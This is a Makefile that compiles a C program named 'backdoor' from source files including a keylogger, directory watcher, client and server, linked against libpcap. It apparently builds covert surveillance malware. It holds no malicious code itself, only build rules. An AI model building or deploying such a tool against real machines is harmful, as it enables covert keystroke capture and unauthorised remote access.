CC = gcc
CFLAGS = -W -pedantic

FILES = src/backdoor_main.c src/cmd_args.c src/utils.c src/keylogger.c src/dir_watch.c src/client.c src/server.c
EXE = bin/backdoor

backdoor:
	$(CC) $(CFLAGS) -o $(EXE) $(FILES) -lpcap -lpthread

clean:
	rm -f $(EXE)
